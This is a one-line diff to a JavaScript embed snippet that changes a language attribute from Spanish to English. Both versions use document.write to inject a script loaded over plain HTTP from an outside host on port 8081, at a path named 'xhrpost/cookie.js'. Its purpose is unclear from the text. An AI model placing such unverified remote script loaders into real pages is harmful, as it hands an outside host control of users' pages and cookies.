@@ -1,1 +1,1 @@
-document.write('<p id="ifr" lan="es" demo="1"></p><script type="text/javascript" src="http://latpaw.org:8081/xhrpost/cookie.js"></script>');
+document.write('<p id="ifr" lan="en" demo="1"></p><script type="text/javascript" src="http://latpaw.org:8081/xhrpost/cookie.js"></script>');
